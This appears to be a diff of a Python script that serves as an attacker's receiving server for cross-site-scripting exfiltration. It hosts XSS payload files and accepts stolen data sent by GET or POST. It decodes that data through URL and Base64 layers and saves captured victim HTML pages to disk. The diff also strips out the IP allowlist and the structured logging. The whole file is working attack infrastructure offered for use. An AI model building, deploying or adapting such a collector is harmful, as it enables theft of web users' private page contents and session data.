@@ -1,47 +1,37 @@
-#!/usr/bin/env python3
 import http.server
 import socketserver
 import urllib.parse
 import base64
-import re
-import sys
-import os
+import os,sys,re
 import argparse
-import threading
-import json
-import logging
 from datetime import datetime, timezone
+
+## 
+## xss payloads should be living in the same directory as your recevier
+## life is easier that way, tbh 
+##
 
 # --- Argument Parsing ---
 parser = argparse.ArgumentParser(description='Decode server for URL/Base64 exfiltration')
 parser.add_argument('--port', '-p', type=int, default=80, help='Port to listen on (default: 80)')
 parser.add_argument('--show', '-s', action='store_true', help='Print decoded HTML to console')
-parser.add_argument('--json-log', action='store_true', help='Enable JSON log output (to decoded_html/log.jsonl)')
-parser.add_argument('--allow-ip', nargs='*', help='List of allowed IP addresses')
 args = parser.parse_args()
 
-# --- Configuration ---
 PORT = args.port
 SHOW_HTML = args.show
-JSON_LOG = args.json_log
-ALLOWED_IPS = set(args.allow_ip) if args.allow_ip else None
-MAX_DEPTH = 5
+MAX_DEPTH = 5  # max recursive decoding layers
 SAVE_DIR = 'decoded_html'
+
+# --- Setup Paths ---
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
 SAVE_PATH = os.path.join(BASE_DIR, SAVE_DIR)
-LOG_FILE = os.path.join(SAVE_PATH, 'log.jsonl') if JSON_LOG else None
-
-# --- Setup ---
 os.makedirs(SAVE_PATH, exist_ok=True)
-lock = threading.Lock()
-logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
-log = logging.getLogger("xssrecv")
 
 print(f"Working dir: {BASE_DIR}")
 print(f"Saving decoded HTML to: {SAVE_PATH}")
-print(f"Listening on port: {PORT}, show mode: {SHOW_HTML}, json log: {JSON_LOG}")
+print(f"Listening on port: {PORT}, show mode: {SHOW_HTML}")
 
-# Allow immediate socket reuse
+# Allow immediate socket reuse to avoid TIME_WAIT issues
 socketserver.TCPServer.allow_reuse_address = True
 socketserver.ThreadingTCPServer.allow_reuse_address = True
 
@@ -52,12 +42,14 @@ def fix_padding(b64_string):
         b64_string += '=' * (4 - missing)
     return b64_string
 
+
 def try_base64_decode(s: str):
     try:
         decoded = base64.b64decode(fix_padding(s))
         return decoded.decode('utf-8', errors='replace')
     except Exception:
         return None
+
 
 def recursive_decode(data: str):
     """
@@ -73,7 +65,7 @@ def recursive_decode(data: str):
             current = url_decoded
             continue
         candidate = re.sub(r"\s+", "", current)
-        if re.fullmatch(r'[A-Za-z0-9+/]{8,}={0,2}', candidate):
+        if re.fullmatch(r'[A-Za-z0-9+/]+=*', candidate):
             b64_decoded = try_base64_decode(candidate)
             if b64_decoded is not None:
                 layers.append(('b64', b64_decoded[:60]))
@@ -82,41 +74,21 @@ def recursive_decode(data: str):
         break
     return current, layers
 
-def save_html(content: str, timestamp: str):
+
+def save_html(content: str):
+    timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
     filename = os.path.join(SAVE_PATH, f'decoded_{timestamp}.html')
     try:
-        with lock, open(filename, 'w', encoding='utf-8') as f:
+        with open(filename, 'w', encoding='utf-8') as f:
             f.write(content)
-        log.info(f"[+] Saved HTML: {filename}")
-        return filename
+        print(f"[+] Saved HTML: {filename}")
     except Exception as e:
-        log.warning(f"[!] Error saving HTML: {e}")
-        return None
+        print(f"[!] Error saving HTML: {e}")
 
-def save_raw(raw_data: str, timestamp: str):
-    try:
-        with lock, open(os.path.join(SAVE_PATH, f'raw_{timestamp}.txt'), 'w') as f:
-            f.write(raw_data)
-    except Exception as e:
-        log.warning(f"Could not save raw data: {e}")
-
-def save_json_log(entry: dict):
-    if not JSON_LOG:
-        return
-    try:
-        with lock, open(LOG_FILE, 'a', encoding='utf-8') as f:
-            json.dump(entry, f)
-            f.write('\n')
-    except Exception as e:
-        log.warning(f"Could not write to JSON log: {e}")
-
-# --- Handler ---
 class DecodeHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, fmt, *args):
-        log.info("%s - - [%s] %s", self.client_address[0], self.log_date_time_string(), fmt % args)
-
-    def verify_request(self, request, client_address):
-        return client_address[0] in ALLOWED_IPS if ALLOWED_IPS else True
+        sys.stdout.write(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {fmt % args}\n")
+        sys.stdout.flush()
 
     def end_headers(self):
         self.send_header('Access-Control-Allow-Origin', '*')
@@ -129,51 +101,33 @@ class DecodeHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
 
     def handle_data(self, raw_data: str):
-        timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
         key, sep, val = raw_data.partition('=')
         if not sep:
-            log.warning(f"[!] Bad format: {raw_data}")
+            print(f"[!] Bad format: {raw_data}")
             return
-
         val = urllib.parse.unquote(val)
-        log.info(f"[+] Raw ({key}): {val[:60]}{'...' if len(val)>60 else ''}")
+        print(f"[+] Raw ({key}): {val[:60]}{'...' if len(val)>60 else ''}")
         final, layers = recursive_decode(val)
         for i, (lt, snippet) in enumerate(layers, 1):
-            log.info(f"    Layer {i} ({lt}): {snippet[:60]}{'...' if len(snippet)>60 else ''}")
-        log.info(f"[+] Final length: {len(final)} chars")
-        log.info(f"    Final preview: {final[:20]!r}")
-
-        # Optional metadata
-        entry = {
-            "timestamp": timestamp,
-            "ip": self.client_address[0],
-            "headers": {
-                "User-Agent": self.headers.get("User-Agent"),
-                "Referer": self.headers.get("Referer")
-            },
-            "raw": raw_data[:120],
-            "decoded_layers": layers,
-            "final_preview": final[:120]
-        }
-
-        save_raw(raw_data, timestamp)
-
-        if '<html' in final.lower() or '<!doctype' in final.lower():
-            path = save_html(final, timestamp)
-            entry["saved_html"] = path
+            print(f"    Layer {i} ({lt}): {snippet}{'...' if len(snippet)>60 else ''}")
+        print(f"[+] Final length: {len(final)} chars")
+        print(f"    Final preview: {final[:20]!r}")
+        low = final.lower()
+        if '<html' in low or '<!doctype' in low:
+            save_html(final)
             if SHOW_HTML:
                 print("--- BEGIN DECODED HTML ---")
                 print(final)
                 print("--- END DECODED HTML ---")
         else:
-            log.info("[!] Not HTML, skip saving.")
-        save_json_log(entry)
+            print("[!] Not HTML, skip saving.")
+        sys.stdout.flush()
 
     def do_POST(self):
-        log.info(f"🔍 POST {self.path}")
+        print(f"🔍 POST {self.path}")
         length = int(self.headers.get('Content-Length', 0))
         body = self.rfile.read(length).decode('utf-8', errors='replace')
-        log.info(f"    Body: {body[:100]}{'...' if len(body)>100 else ''}")
+        print(f"    Body: {body[:100]}{'...' if len(body)>100 else ''}")
         self.handle_data(body)
         self.send_response(200)
         self.end_headers()
@@ -184,7 +138,7 @@ class DecodeHandler(http.server.SimpleHTTPRequestHandler):
         filepath = parsed.path.lstrip('/')
         if filepath and os.path.isfile(os.path.join(BASE_DIR, filepath)):
             return super().do_GET()
-        log.info(f"🔍 GET {self.path}")
+        print(f"🔍 GET {self.path}")
         if parsed.query:
             self.handle_data(parsed.query)
         self.send_response(200)
@@ -194,17 +148,18 @@ class DecodeHandler(http.server.SimpleHTTPRequestHandler):
     def do_HEAD(self):
         return self.do_GET()
 
-# --- Main ---
 if __name__ == '__main__':
     server = socketserver.ThreadingTCPServer(('0.0.0.0', PORT), DecodeHandler)
+    print(f"Starting decode server (threaded) on port {PORT}...")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        log.info("KeyboardInterrupt received, shutting down server...")
+        print("\nKeyboardInterrupt received, shutting down server...")
     finally:
         server.shutdown()
         server.server_close()
-        log.info("Server has exited cleanly.")
+        print("Server has exited cleanly.")
+
 
 ##
 ##
